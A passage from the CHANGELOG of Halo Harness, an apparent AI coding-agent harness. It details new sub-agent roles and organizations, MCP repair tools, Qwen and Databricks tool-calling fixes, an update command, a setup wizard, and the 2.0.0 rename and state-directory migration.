   `--output-format json/stream-json` consumer's own piped output).
2. **Roles v2**: `ROLE_NAMES` grows from five to ten -- `planner` (the
   `Plan` agent's own role now, moved off `reviewer`), `judge` and `tester`
   (two new built-in agents with matching roles), `compaction` (a rung
   between `compactionModel` and the session's main model), and
   `subagent_default` (the last rung before the session model, for a
   sub-agent with no role at all). A role's table value may now be
   `{"model", "effort"}` instead of a bare string, applied through the same
   path the session's own effort takes; `/roles` and the role resolver show
   `requested (sent as X)` when a role's effort maps to a different one on
   its route. Any syntactically-valid custom role name (`[a-z][a-z0-9_]*`)
   a team.json or a loaded template defines is now a valid role everywhere
   a built-in one is -- `--role NAME=MODEL[:EFFORT]`, `/role <name> <model>
   [effort]` (new) and `/roles set` all validate against the live set of
   known names. TUI tab completion for `/role`/`/roles set`'s arguments
   (role name, then model ref, then effort -- ranked prefix-then-substring,
   `tui/completion.py::filter_items`) and shell completion (`halo
   completion bash|zsh|powershell`, reading the cached model catalog with
   no network call) are both new. Role TEMPLATES
   (`~/.halo/roles/<name>.json`) are a new named, reusable role table:
   `/roles templates|save|load|new|edit|show` in the TUI (`edit` opens a
   form, `tui/dialogs/roles_editor.py`, or `$EDITOR` when `roles.editor:
   "external"` is configured) and `halo roles template list|save|load|new|
   edit|show` from the CLI.
3. **Organizations**: `halo_harness/orgs.py` (new) -- a named, reusable
   TREE of sub-agent positions (`role`/`model`, `effort`, `instructions`,
   a tool allowlist, and the OTHER positions it may itself delegate to)
   saved as `~/.halo/orgs/<name>.json`, with exactly one root (the title
   nobody else's own `reports` names). Three built-ins ship copied in on
   first use and are never overwritten once present: `solo` (one
   orchestrator), `release-flow` (the brief -> implement -> test -> review
   -> fix -> retest -> report loop this project is itself built with --
   `Fixer` delegates back to the SAME `Tester` position `Implementer`
   delegated to earlier, a reused edge rather than a second copy), and
   `company` (CEO -> three VPs -> one manager each -> two workers each).
   Running one (`/org run <name> "<goal>"`, `Agent(org=<name>,
   prompt=<goal>)`, or `halo org run <name> "<goal>"`) turns every position
   into a real `AgentSpec` and spawns the root through the EXACT sub-agent
   machinery an ordinary `Agent` call already uses -- each position's own
   `reports` becomes its `agent_type_restriction` (a call outside it is
   refused with a clear tool error, the same check a `tools:
   ["Agent(name)"]`-restricted agent file already enforced, now actually
   reaching a child for the first time), depth comes from the org's own
   tree shape instead of the usual depth-1 cap, and concurrency is the new
   `agents.max_concurrent` config knob (default 4, applies to every
   session now, org or not) unless the org sets its own. The dock shows a
   running position as `<title> (<role>)` instead of the bare title
   (`AgentSpec.dock_label`). `/org list|show|new|load|edit|run` in the TUI
   (`edit` opens a tree-view-left/fields-right form, `tui/dialogs/
   org_editor.py`; `load` re-installs a built-in over a local copy) and
   `halo org list|show|new|edit|run` from the CLI. See
   [docs/ORGS.md](docs/ORGS.md).
4. **Sub-agent visibility and scale**: `/tasks`/Ctrl+T (new, `tui/dialogs/
   tasks.py`) -- a full-height panel listing every running, queued,
   background and finished sub-agent (and background job) of this
   session, an org run's own descendants indented under their parent;
   Enter opens a live, follow-mode transcript viewer of that agent's own
   log (`PgUp`/`PgDn` scroll, `o` the full pager); a second tab shows the
   new shared task board. The status bar shows `agents N` (running
   count) when N > 0. `agents.max_depth` (config, default 1, up to 3; an
   org's own tree shape overrides it, unclamped) joins `agents.max_
   concurrent` as a real config knob instead of a hard-coded constant.
   The Agent tool gains `count` (N identical copies of `prompt`) and
   `batch` (a list of `{prompt, role?, model?, effort?}` objects) --
   spawns several sub-agents in one call, capped at `agents.max_
   concurrent` (excess ones queue, announced to the panel immediately via
   a new `subagent_queued` event, and start as slots free); the parent
   waits on all of them and gets back one combined result, one
   `<task_result>` section per child, in spawn order. A new shared task
   board (`TaskCreate`/`TaskUpdate`/`TaskList` tools, `~/.halo/sessions/
   <id>/tasks.json`) lets every sub-agent of a session -- an
   organization's workers, most usefully -- claim and report on open
   work; claiming an already-claimed task is refused, never a lost
   update. Two `/org run` gaps closed on the way: its own result used to
   land in the transcript as a raw `<task_result task_id="...">` block
   with no live progress at all (it now streams through the same live
   sub-agent machinery an `Agent(org=...)` tool call already uses, so the
   root position -- and everything it delegates to -- gets a real card
   with its own position title, and the final text is unwrapped before
   display); and an org run's own spend, though it was already rolling
   into the session's cost meter correctly, never reached the status bar
   (nothing re-reads it once a slash command finishes outside the normal
   turn loop) -- it now pushes a fresh status refresh once the run
   completes. See [docs/SUBAGENTS.md](docs/SUBAGENTS.md).
5. **MCP repair actions**: `/mcp` gains a key legend plus the rest of the
   repair surface -- `R` reconnect every server, `l` login (the 2.0.1
   OAuth flow for a local `http`/`sse` server, or the claude.ai connector
   re-auth pointer), `L` a tail of `~/.halo/mcp/<server>.log` (stdio
   stderr PLUS connect/transport errors, both appended to the one file
   now, rotated at 1 MB instead of 5), `e` edit the entry at its own line
   in `$EDITOR`, or an inline form with no `$EDITOR` set (`tui/dialogs/
   mcp_entry_form.py`, new), `i` an install hint for a command-not-found
   server guessed from the missing command (`npx`/`node`/`uvx`/`uv`/
   `pipx`/`pip`/`python`), `d` disable/enable per directory (Claude
   Code's own `disabledMcpServers`), and `t` a timed `tools/list` round
   trip. Every failed/needs_auth/pending_approval/disabled row carries
   its reason and one fix line (`mcp_cli.fix_line_for`, shared code --
   `halo mcp fix <name> [--apply]` prints and, with `--apply`, runs the
   exact same diagnosis from the CLI; `halo mcp test <name>` is `t` from
   the CLI). A server that dies mid-session reconnects on its next use
   with backoff (1, 2, 4, 8s, then every 30s, giving up after 10 minutes)
   instead of retrying on every single call; the row shows the attempt
   count and next retry, and a manual `r`/`R`/`--apply` always resets it.
   `(McpManager.reconnect_manual`/`McpServerHandle` backoff fields, `mcp/
   manager.py`.) Fixed along the way: approving a pending `.mcp.json`
   server from `halo mcp fix --apply` left the live handle's own stale
   `pending_approval` flag set, so the reconnect that's supposed to
   follow silently no-op'd every time (the TUI's own `a` action already
   cleared it; this CLI path now does too). See the `/mcp` section and
   `halo mcp fix`/`test` in [docs/COMMANDS.md](docs/COMMANDS.md), and the
   "a server shows failed" walkthrough in
   [docs/TROUBLESHOOTING.md](docs/TROUBLESHOOTING.md). Two round D fixes
   on the way out: `e`'s external-editor launch no longer passes vim's
   own `+<line>` argument to every `$EDITOR` -- `code`/`subl` get their
   own line syntax now (`--goto file:line`/`file:line`), anything else
   opens the file plain; `halo mcp learned [--forget <endpoint>]` lists
   (or clears, before its TTL) a learned per-endpoint provider rule
   (`providers/learned_rules.py`, round 5's own "tools_rejected" cache).
6. **Qwen tool calling at work**: the owner's work-VM "openjev qwen"
   report traced to `databricks-openjev-qwen35-4b`, Databricks' own
   decision-only "evaluates yes/no, choice, and scoring questions"
   endpoint -- never a chat/tool-calling model. Classified from DATA
   (`model_table.json`'s top-level `decision_only_name_patterns` substring
   net, plus the row's own `capabilities.decision_only`), never a
   hardcoded id check: the `/model` picker now groups it under "Databricks
   (judge / decision)" with that one-line description, `/model`/picking it
   never installs it as the session model -- it's routed to the `judge`
   role automatically instead, with a plain notice -- and a request that
   still carries `tools` for it (or for ANY Databricks endpoint a live
   request already proved rejects tools, learned per-endpoint in
   `~/.halo/learned-rules.json`, even with no table row at all) gets one
   clear error naming the model and the judge role instead of a wire 400
   (`providers.request.ToolsNotSupported`; the live-400 twin lives in
   `agent/loop.py` via the new `providers.errors.is_tools_rejected_
   message`). Separately, two leak-repair patterns every Qwen row had
   declared since H2 but `providers/hooks.py` never implemented are now
   real: `python_repr_args` (a bare single-quoted Python-dict-literal tool
   call, no wrapper at all) and `missing_tool_call_opener` (Qwen3-Coder
   #475's own shape -- a `}</tool_call>` tail with no opening tag).
   `think_tag_strip` now also strips a bare leading `</think>` with no
   opener (Qwen3-235B-Thinking-2507/QwQ's documented replay shape), and
   `providers/request.py`'s Databricks schema simplifier now rewrites a
   forbidden `prefixItems` keyword to `items` plus a `description` note
   instead of leaving it on the wire (the 16-key cap was already enforced
   by the time this round started -- the research doc's claim otherwise
   was stale, not a live defect). See
   [docs/harness/QWEN-RESEARCH.md](docs/harness/QWEN-RESEARCH.md),
   [docs/harness/FAMILY-BASELINE-qwen.md](docs/harness/FAMILY-BASELINE-qwen.md)
   and the new "Qwen at work" section in
   [docs/MODELS.md](docs/MODELS.md). Still unconfirmed until the owner
   sends a real `halo bugreport`: the exact endpoint/HTTP body, whether a
   400 or a silently-ignored 200 is what it actually returns for a
   tool-bearing call, and whether `tools` were present on the first
   failing turn or a later one.

7. **`halo update` and `/update`**: `halo_harness/update.py` (new) knows
   what's installed (PEP 610 `direct_url.json` -- commit and requested
   revision for a git install, `git rev-parse`/`git branch` in the
   checkout for an editable install or a bare PYTHONPATH run) and what's
   available upstream (`git ls-remote` against GitHub, or the REST API
   with no git on PATH; cached 24h in `~/.halo/update-check.json`,
   honouring `update.check: false` and `BRIDGE_TEST_NO_BACKGROUND_NET`).
   `halo --version` now prints `halo 2.0.2 (c93480d, master)` once the
   commit is known; `halo doctor` gains an "install" line naming how,
   from where, and which commit. `halo update --check` reports installed
   vs. available, the commits between them, and the exact reinstall
   command, exiting 0/10/1 (up to date/available/unknown); `halo update`
   (apply, `update_cli.py`) refuses while another halo process looks like
   it's running on this machine (excluding itself) unless `--force` --
   a reinstall under a running TUI has broken the install on Windows
   before -- then runs the command live and reports the before/after
   commit from a fresh `halo --version`. `/update` in the TUI runs the
   same check on a worker and opens a dialog with `Enter: update and
   restart halo` / `Esc: not now`; Enter exits the TUI with a sentinel
   return code, and `cli.main` -- only now past the TUI, which has
   already torn down -- runs the update with its output visible and
   relaunches with `--continue`, the only safe order on Windows (quit,
   then update, then relaunch). A cached "update available" note shows
   once a day at TUI startup, off with `update.check`/`update.notify:
   false`. `scripts/install-halo.ps1` (new) mirrors `install-halo.sh` for
   Windows PowerShell. README/docs/INSTALL.md gain matching Install and
   Update sections; docs/INSTALL.md also gains an Uninstall section.
8. **One init wizard, Roles/Organizations setup screens**: owner report
   -- "I have to press esc then it exits then brings up the next
   section ... there should be a button you select to move it forward
   ... there should be an init step that lets you set up roles first too
   or skip for later ... a setup screen should pop up to set those
   features up in addition to doing it within halo ... selection of
   templates would be good". `tui/dialogs/init_wizard.py` (new): ONE
   Textual app for the whole interactive `halo init`, `Step N of M: <name>`
   header, `Back`/`Skip`/`Next` (`Finish` on the last step) footer, Esc
   asking "Quit setup? What you saved so far stays" instead of ending
   silently -- Providers (the existing tabs content, moved in), Default
   model, Permission mode, **Theme** (new: the six built-in themes, a
   live preview), **Roles** (new: a `roles.enabled` switch, default on,
   three shipped presets -- `balanced`/`quality`/`local-first` -- with a
   preview, `Edit roles...` opening the round-1 form inline), **Organizations**
   (new: an `orgs.enabled` switch, default off, a default-org pick,
   `Edit org...` opening the round-2 form inline), Linux fixes (skipped
   automatically when nothing needs fixing), Summary. Both modes gate
   discoverability only (`/roles`/`/role`/`/org` hidden from `/help`/
   completion/the rotating tips, the `/tasks` board tab, and the `Agent`
   tool's own `org=` parameter while off) -- never a functional gate; an
   org/role invoked by name still works either way. `halo setup
   [roles|orgs]` (new `setup_cli.py`) and `/setup [roles|orgs]` (`tui/
   slash.py`) reopen the Roles/Organizations screens later -- a bare
   `halo setup`/`/setup` chains roles -> orgs -> a short summary; with no
   TTY, `halo setup` prints the current roles table/orgs list and exits
   0. The round-1 roles editor and round-2 org editor both gain a "start
   from a template" picker at their top (roles also gains `Save as
   template...`). Paperclip-derived additions to organizations (brief
   3b): **budgets** (`budget_usd` on an org and/or a position, enforced
   through the existing cost meter -- a hard stop refuses a FURTHER
   delegation once reached, a warning at 80%; the call already running
   always finishes) and **goals** (`/org run`'s own goal becomes a root
   task, `kind: "goal"`, on the shared board before the root position
   runs; every position is told to link its own tasks to it via
   `TaskCreate`'s new `parent`). `orgs.default` (`/org run`/`halo org
   run` with no name) is new too. The rest of brief 3b lands this round
   too: `halo org install <name> [--force]`/`/org install` copies a
   shipped built-in or a template saved under `~/.halo/org-templates/`
   into `~/.halo/orgs/`, refusing to overwrite without `--force` -- each
   shipped template's own `description` IS its one-line README, shown by
   `/org list`/`halo org list` (which now prints it) and the wizard's
   Organizations step (already did, via the tree preview). **Approval
   gates**: a position with `requires_approval: true` holds its just-
   finished result as a pending card in the SAME dock a permission/
   question/plan-review ask already uses (accept, edit the instruction
   and re-run -- recurses through the ordinary spawn path, capped at 5
   revisions -- or stop); with no live dock reachable (`halo org run`/
   `resume` from a plain terminal) it prints the result and waits on
   stdin instead, the same one-line-read convention `halo init`'s own
   non-interactive prompts use; `--yes` on `run`/`resume`, or the
   session's own `dontAsk` permission mode, accepts every gate
   automatically -- the OPPOSITE of `dontAsk`'s usual "ask converts to
   deny" rule, since a gate is never a tool-permission ask.
   **Export/import**: `halo org export <name> [file]` / `import <file>`
   move an org as plain JSON (import validates role names, reports and
   budgets, listing every problem); `halo roles template export|import`
   is the same pair for role templates. **`/org resume`** (and `halo org
   resume <session-id>`) continues an interrupted run from a session's
   own saved run record (`<session_dir>/org-run.json`, written when the
   run starts) and shared task board -- open and claimed tasks become
   the new root position's own work list, done tasks are named and kept
   (never redone); the resumed run's own `max_concurrent`/`budget_usd`
   come from that saved record, not whatever the org definition
   currently says, so an edit made after the original run started can
   never change what the resumed run is bound by.
9. **Release review, two fix rounds**: an Opus review of the whole
   `v2.0.1..` diff found 3 critical, 15 major and 21 minor defects, each
   with a check for whether it was actually confirmed by running or
   tracing the code; both fix rounds closed every one with a test that
   failed before and passed after. Round A (criticals/majors): `halo
   init`'s Default model step
   no longer saves the first catalog row when you press Next without
   picking (RolesStep's own "Next overwrites your current roles" bug,
   reintroduced by the wizard, closed the same way); a decision-only
   endpoint can no longer become the session default from the picker or
   a remembered model, and the Judge sub-agent runs tool-less against one
   instead of raising `ToolsNotSupported`. `halo update`/`/update` work
   on Windows now -- the uv launcher that stays alive as this process's
   own parent is no longer mistaken for another session, and an
   editable/checkout install's `git pull` + reinstall runs in the
   checkout, never whatever directory you happened to be sitting in.
   `/org run` and a resumed org task no longer take the TUI down on an
   unresolvable model, org budgets are enforced against a real per-org
   total instead of a baseline that never moved, a delegating org's
   nested sub-agent cards keep their own identity instead of all ticking
   under the root's, org depth is relative to the caller's own depth, and
   the per-call concurrency cap became one session-wide (or org-wide)
   gate so two fan-out calls in the same turn -- or a nested one -- can
   no longer double the configured cap. MCP repair: OAuth login from
   `/mcp` can be cancelled and the dialog dismissed while it waits, the
   inline entry form's args field accepts spaces and several lines
   without splitting them, and `R` skips a server you disabled. The
   `/tasks` panel refreshes on a worker thread with a cached parse per
   log file instead of re-reading every agent log on the UI thread every
   second. Roles: the `small` role is actually consulted now, and
   `roles.enabled`/`roles.editor` stop being misread as role names.
   Round B (the minors): the `/mcp` dialog re-reads each server's real
   state from the Controller after an action instead of guessing it from
   the result text (a failed `t` no longer flips a row to "connected");
   `/tasks`' transcript viewer keeps your scroll position while the log
   keeps growing, and its own board tab is reachable with `orgs.enabled`
   off too, since the board itself always worked. `count`/`batch` apply
   the call's own `effort`, reject an unknown `role` by name (listing the
   known ones, the same as an unknown `subagent_type` already did) on
   every surface (single spawn, fan-out, resume), and their combined
   result is capped and spilled to disk like every other tool's instead
   of returning megabytes raw. `/role`/`/roles set` now land where the
   model-resolution chain actually treats as winning over an agent file's
   own `model:`, with the model and effort validated; its own effort
   completion reads the model you actually typed, not the role name or
   the literal word "set". An org run's sub-agents list parent-before-
   children instead of by whatever order their random ids sorted into,
   and the tasks panel restores your highlighted row by id, not index.
   The `balanced`/`quality`/`local-first` presets skip a free/negative-
   priced or tool-less catalog entry instead of picking OpenRouter's own
   router alias as "the cheapest model". An org's root position is
   visible to the tasks panel's live cost/phase lookup now (it used to
   get its own disconnected bookkeeping). `halo update`'s relaunch on
   Windows waits for a real child process instead of exiting this one
   outright and racing the console with it. The real terminal title is
   written through Textual's own output thread while the TUI runs
   instead of racing its frames directly on `stdout`. A learned "this
   endpoint rejects tool calls" rule now expires after a day instead of
   needing a hand edit to `learned-rules.json` to undo. The `Agent` tool's
   own description lists the live, configured role names instead of a
   stale fixed five, and no longer claims a sub-agent can never delegate
   further (true only at the default depth). The shared task board
   survives an interrupted write (atomic replace) and keeps a corrupted
   one aside instead of silently replacing it with a single fresh task.
   A long tool-less Qwen answer no longer costs seconds in a leak-
   pattern regex. `halo org edit`/`halo roles template edit` no longer
   crash with a bare traceback when `$EDITOR` is multi-word (`"code
   --wait"`) or needs Windows' own PATH extension resolution. `halo
   completion` lists `update`/`org`/`setup` (missing outright before) and
   its zsh/bash scripts handle a `:`-bearing model ref correctly. The org
   editor's Ctrl+D (delete position) now reaches the screen even with a
   field focused -- Textual's own Input/TextArea binding AND an unrelated
   app-level "quit on empty/delete-right in the chat box" binding were
   both intercepting it first -- and a bare model alias typed into "Role
   or model" (`haiku`, `sonnet`) saves as a model, never a role that then
   fails validation. `/org run <name> "<goal>"` strips the quotes from
   the goal instead of sending and recording them literally.

## [2.0.0] - 2026-10-01

The rename release: `rolo-claude` 1.0.1 continues unchanged, as its own
repository; this one, Halo Harness, is where every later feature lands.
Nothing about runtime *behavior* changes here beyond the migration and
alias notices below -- every 1.0.1 fix ships exactly as it was.

1. **Product renamed to Halo Harness**: console script `halo` (`python -m
   halo_harness`); distribution `halo-harness` on PyPI (`halo` itself is a
   spinner library -- never collide); Python package `halo_harness`
   (`rolo_claude` renamed in place, every import/reference updated).
   `rolo-claude` keeps working forever as a deprecated console-script
   alias -- one notice line to stderr (`halo: 'rolo-claude' is deprecated,
   use 'halo' instead`), then runs exactly like `halo`, same process, same
   parser, including `rolo-claude proxy`. `halo proxy ...` is the renamed
   spelling of what `rolo-claude proxy`/`claude-bridge` already did
   (`bridge.py`, unchanged).
2. **State directory migration**: the default state dir is now `~/.halo`
   (was `~/.rolo-claude`). The first time anything in a fresh Halo Harness
   process resolves it, an existing `~/.rolo-claude` is renamed (never
   copied) to `~/.halo`, announced with one stderr line; every call after
   that (in this or any later process) just finds `~/.halo` already there
   and says nothing further. No link is created at the old location (`rm
   -rf ~/.rolo-claude/` with a trailing slash follows a symlink/junction
   and would empty `~/.halo` right along with it) -- a still-installed
   `rolo-claude` 1.0.1 must never be run again after this, since it would
   start from a truly empty `~/.rolo-claude`. A rename that fails (a
   locked file on Windows, a read-only/cross-device home on Linux) prints
   one warning and keeps using `~/.rolo-claude` for that run instead of
   silently losing state in a `~/.halo` that was never actually populated;
   when the rename instead loses a race to a concurrent process that
   migrates first, the `~/.halo` it left behind is adopted silently.
   `halo doctor` reports a standing WARN whenever both directories end up
   holding real data. `BRIDGE_STATE_DIR` keeps overriding the state dir
   outright, exactly as before (no migration logic runs when it's set).
   Test seams (`BRIDGE_TEST_HOME`, `BRIDGE_TEST_NO_BACKGROUND_NET`,
   `BRIDGE_TEST_CC_AUTH_STATUS`, and `BRIDGE_STATE_DIR` itself) keep their
   exact names -- no `HALO_` twin for these, by design.
3. **Env file**: `halo init` now writes `~/.config/halo/env` (was
   `~/.config/vibes-hacker/env`), copying the old file's content forward
   (directory 0700, file 0600) the first time it writes on a box where
   only the old one exists yet, so nothing already configured there is
   orphaned. The old file is never modified or renamed (other tools on
   the same box read it); the copied-forward new file starts with an
   import marker line, and once that marker is present the old file is
   no longer consulted, so a key you delete from the new file stays
   deleted. Without the marker (a hand-written new file) reading still
   checks the new file, then the old one, so a credential that only
   ever lived in the old file keeps working even before `halo init`
   runs again. `HALO_ENV_FILE` is the new override
   name; legacy `BRIDGE_ENV_FILE` keeps working (an explicit override
   always wins outright, with no blending between the two files).
4. **Env vars**: every harness-owned `BRIDGE_*`/`ROLO_CLAUDE_*` knob
   (`OPENROUTER_BASE_URL`, `ANTHROPIC_BASE_URL`, `DBX_BASE_URL`/
   `DBX_TOKEN`, `MODEL`/`MODEL_SMALL`, `ENV_FILE`, `CLAUDE_EXE`, `DUMP`,
   `CA_BUNDLE`, `THEME`) now has a canonical `HALO_*` name, checked first;
   the old name still works, logging one DEBUG line the first time it's
   what actually supplied the value. See `docs/CONFIG.md`'s "Every
   environment variable" table for the full list.
5. **Launch intro**: a fresh interactive launch (TUI, including
   `--continue`/`--resume`) types out `I am just a copy, of a copy, of a
   copy... halo 2.0.0` character by character above the first turn, like
   someone typing it, with a block cursor while typing; any keypress or a
   submitted prompt finishes it instantly, and the prompt input keeps
   focus throughout so nothing typed during it is ever lost. Never shown
   in print mode, a `--demo` run, or when stdout isn't a real terminal;
   `"intro": false` in `~/.halo/config.json`, or `--no-intro`, turns it
   off for good; `/intro` replays it mid-session.
6. **Compatibility odds and ends**: a project's `.rolo-claude/team.json`
   (checked into a repo before this rename) is still found, with one
   deprecation line, when `.halo/team.json` is absent. `/improve`'s
   provenance marker and the `~/.local/bin`-on-PATH rc-file marker both
   still recognize the exact text 1.0.1 wrote (a new write always uses the
   new text) -- so a file or rc-file line 1.0.1 already produced is never
   mistaken for user-authored, and `halo init` re-run on an upgraded box
   never appends a second PATH block. The `stream-json` `system/init` line's
   version field is now `halo_harness_version`; `rolo_claude_version` (same
   value) ships alongside it for a script that already reads the old name.
   The state directory itself (item 2) gets no compatibility link of its
   own, unlike these -- no link is created there, on purpose, since a
   leftover link would make `rm -rf ~/.rolo-claude/` dangerous.
7. **Docs/tests**: README/CHANGELOG/docs/briefs/guard tests all updated to
   the new names; this entry is the only CHANGELOG section written under
   them -- every entry below keeps the name it was written under.
8. **Shadow-repo long paths on Windows**: the `/rewind` git-shadow repo
   (`~/.halo/sessions/<slug>/<session_id>/shadow/`) now sets `core.
   longpaths true` right after `git init` on Windows -- the shadow repo's
   own path plus a mangled absolute source path underneath it can exceed
   Windows' 260-character limit under a long home or cwd, which git itself
   refuses without this setting.

## [2.0.1] - 2026-10-03

The "run from any directory" release: `halo` already discovered a
directory's `CLAUDE.md` chain, `.claude/rules`, settings, `.mcp.json`,
skills, commands and agents from the cwd the same way `claude` does --
this release makes the INSTALL unmistakable and proves the no-repo-needed
claim with tests, rather than changing that discovery behavior itself.

1. **`docs/INSTALL.md`** (new, top-level, linked from the README):
   leads with one install line per platform -- from a clone,
   `uv tool install --reinstall .` (or `pipx install --force -e .`, with
   a PEP 668 note for Kali/Debian 12+), or directly from GitHub with no
   clone at all, `uv tool install git+https://github.com/roloVibes/Halo-
   Harness` -- then "cd anywhere, type `halo`". The clone directory is for
   `git pull` only; the exact same reinstall command runs again after
   every pull. Keeps its own "Upgrading from rolo-claude 1.0.1" section;
   `docs/harness/INSTALL.md` (the exhaustive walkthrough -- PEP 668 detail,
   the offline work-box recipe, terminal notes) is unchanged and linked
   from the new page.
2. **`doctor`/`init`'s PATH check now names which of three things `halo`
   resolves to**, not just OK/WARN: the installed console script (OK, now
   labelled "installed console script" in the line itself), this
   checkout's own `bin/halo`/`bin/halo.cmd` wrapper (WARN, now says
   plainly "not the installed console script"), or neither at all (WARN,
   now names the PYTHONPATH fallback by name instead of just "not found").
   `halo init`'s summary still ends with this same check plus "Run it
   from any directory -- the checkout is only for `git pull`." whenever
   it isn't the installed copy.
3. **No remaining dependency on the repo directory, proven by test**:
   `bin/halo`, `bin/halo.cmd` and `bin/rolo-claude` were already thin
   fallbacks (prefer an installed console script on PATH, only then fall
   back to `PYTHONPATH=<repo>`) and every vendored data file (the model
   table, the OpenRouter/Databricks catalog fallbacks, the TUI's
   `styles.tcss`) already loaded relative to the package, not the cwd --
   a new test now imports the package with the process `cwd` set to a
   directory outside the checkout and loads each of them directly, so a
   future regression back to a cwd- or repo-relative path fails loudly.
   No test in the suite assumes its own cwd is the repo root (audited).
4. **New tests prove the acceptance criteria directly**: `halo --version`,
   `halo doctor` and `halo -p` each run as a subprocess from a scratch
   directory outside the checkout (literally under the OS temp dir --
   `/tmp` on Linux/Kali); a further `halo -p` test builds a scratch
   project whose `CLAUDE.md` holds one unique sentence and, with a mock
   upstream standing in for the model, asserts that exact sentence
   reached the assembled request body.
5. **Launch hang fixed** (owner's own live use on a Databricks-only work
   VM): `halo` printed the migration line, then sat for a long time before
   the TUI appeared. Cause: `providers.enablement.credentials_present
   ("claude_subscription")`/`init_providers.claude_login_available()` each
   called `claude auth status` directly, uncached, from several places
   startup reaches synchronously -- on a box where the installed `claude`
   is wired to a gateway (Databricks, through Claude Code's own settings
   env) that subprocess hung for its full 10s timeout, every single call.
   Fixed:
   - `credentials_present("claude_subscription")`/`claude_login_
     available()` now read ONLY the existing startup worker's cache
     (`cc_models.cached_claude_auth_status()`) -- a cache miss reads as
     "not detected yet" and never spawns anything itself. The flows that
     genuinely need a fresh, live answer right now (`halo init`'s tabs
     and sequential/`--provider claude` paths, `halo doctor`, and the
     `halo providers` / headless `/providers` listings, which are always
     a fresh process and otherwise printed a real claude.ai login as
     "not set up") call the existing `refresh_cached_claude_auth_status()`
     explicitly instead, once, off the UI thread where one exists.
   - New gateway rule (`cc_models.is_claude_gateway_driven`): when
     `ANTHROPIC_BASE_URL`/`ANTHROPIC_AUTH_TOKEN` (shell env or Claude
     Code's own trust-filtered settings chain) or a settings `apiKeyHelper`
     are present, `claude` is gateway-driven and `claude auth status` is
     never spawned at all, by any caller, including the startup worker and
     `halo doctor`'s own check -- `/providers`/`halo providers` show "not
     set up (claude is configured for a gateway)" instead of an ambiguous
     "not set up". The same check also short-circuits `model.
     parse_model_ref`'s bare-alias resolution (`cc_models.default_bare_
     alias_route`), the other place this exact subprocess could hang
     synchronously before a session's first turn.
   - `tui/app.py`'s existing startup worker remains the ONLY launch-time
     spawner for the TUI; it now also posts a one-time, quiet notify once
     it lands, when (and only when) a usable subscription is actually
     found. Headless mode has no UI thread to protect and no startup
     worker of its own -- `/providers` run headlessly refreshes inline,
     staleness-gated, right there (`commands/builtins.py::_cmd_providers`),
     instead of a thread on every `build_session` call -- verified live,
     that ran one real `claude auth status` subprocess PER SESSION BUILT
     on a box with a genuine `claude` install, slowing this project's own
     test suite considerably; refreshing only where `/providers` is
     actually used headlessly avoids that entirely.
   - `--debug`/`-d` now also prints a `[timeline]` line per startup phase
     (settings, instructions, session build, MCP discovery, first paint),
     each with milliseconds elapsed, to both stderr and `bridge.log`
     (`halo_harness/debug_timeline.py`).
6. **Single executable**: `pyproject.toml`'s `[project.scripts]` now ships
   exactly `halo` -- `rolo-claude` is no longer a second installed console
   script. The 2.0.0 CHANGELOG entry above promised the `rolo-claude`
   alias would keep working "forever" as an installed console script; that
   is superseded by the owner's own first real install attempt on a work
   VM, where an old, separately-installed `rolo-claude` 1.0.1 tool already
   owned that name and made a fresh `uv tool install --editable .` of Halo
   fail outright (`Executable already exists: rolo-claude (use --force to
   overwrite)`) -- `halo` never got installed at all. `rolo-claude` keeps
   working as a deprecated alias two other ways that never register a
   second console script: `bin/rolo-claude` (run straight from a checkout)
   and `cli.main_deprecated_alias` (kept in the source, just no longer a
   pyproject entry point). Uninstalling the old tool first is still
   recommended, so the stale command can't run by mistake -- but a Halo
   install itself must never fail because the old tool exists, and now it
   can't. `halo doctor` gains a WARN when a `rolo-claude` other than this
   checkout's own `bin/rolo-claude` script is still found on PATH, naming
   the matching uninstall command (`uv tool uninstall rolo-claude`/`pipx
   uninstall rolo-claude`/`pip uninstall rolo-claude`) as its fix.
   `docs/INSTALL.md`, `docs/harness/INSTALL.md` and the README's upgrading
   sections are updated to match: uninstalling the old tool is a
   recommendation, not a precondition.
7. **GLM on Databricks: the "pause" was a silent effort mismatch, not a
   hang** (W2a, provider/loop/telemetry side -- see
   [MODELS-families.md](docs/MODELS-families.md#databricks-glm-201-glm-briefmd) and
   [TROUBLESHOOTING.md](docs/TROUBLESHOOTING.md#glm-seems-to-pause-201)):
   - **The default is sent, not omitted**: an omitted `reasoning_effort`
     on this route means `max`, so a call with no effort configured sends
     `high` explicitly (`ProviderProfile.default_effort_when_unset`, on
     for the Databricks GLM family only), and an effort inherited from
     Claude Code's settings (`effortLevel`, typically `xhigh`) that the
     route does not accept lands on `high` too; an explicit `--effort` or
     `/effort xhigh` is still clamped to `max` as a deliberate choice.
     Switching into a GLM route mid-session applies the same default.
   - **Effort clamp table**: every `databricks-glm-*` endpoint (tabled or
     not) now accepts exactly `low`/`high`/`max`, default `high` (was
     silently sent as whatever the user picked, including values the
     gateway itself then silently coerced to `max` with no error at all --
     `medium -> high`, `minimal -> low`, `xhigh -> max`, `none -> low`,
     via a new `ProviderProfile.effort_clamp_map` `clamp_effort`/`map_effort`
     consult before the generic xhigh/max narrowing). OpenRouter
     `z-ai/glm-5*` keeps the full seven Z.ai-direct values. `--effort`/
     `/effort` show the value actually sent (`medium (sent as high on this
     route)`); a new `providers/effort.py` (`effort_set`, `sent_effort`,
     `requested_vs_sent`) is the one place `/effort`, `/status`, `/context`
     and the stream-json `system/init` line's new `effort`/`effort_sent`
     fields all read this comparison from.
   - **Steer during the silent pre-first-token wait now restarts the
     call**: config `steer.restart_when_silent` (default true) -- when a
     steer arrives and no content has streamed yet for the in-flight call,
     it's aborted and resent immediately with the steer appended (a new
     `steer_restart` event; `--verbose` prints one line) instead of
     waiting for the first chunk to cut in, the way an ordinary mid-stream
     steer already did.
   - **Finish-reason handling**: a chat-dialect `finish_reason:
     "model_context_window_exceeded"` now feeds the existing overflow ->
     compaction -> retry path (previously read as a plain "end_turn");
     `"sensitive"` becomes a clear, never-retried error naming whatever
     text the provider did stream.
   - **GLM never receives `tool_choice: "required"`** (already true via
     `tool_choice_required_supported`, now pinned by test) and temperature
     is clamped to `[0, 1]` on every GLM-family route.
   - **New per-call telemetry** in the session log: `ttfb_ms`,
     `first_reasoning_ms`, `first_text_ms`, `first_tool_ms`,
     `reasoning_streamed` (does this gateway actually stream reasoning
     incrementally, or does it arrive as one lump?). `halo stats --models
     --wide` adds TTFT p50/p95, a count of calls that waited over 20s for
     their first token, and "reasoning streamed" as a percentage, per
     model.
   - **`phase` events** (`events.py`): `request_sent`, `headers`,
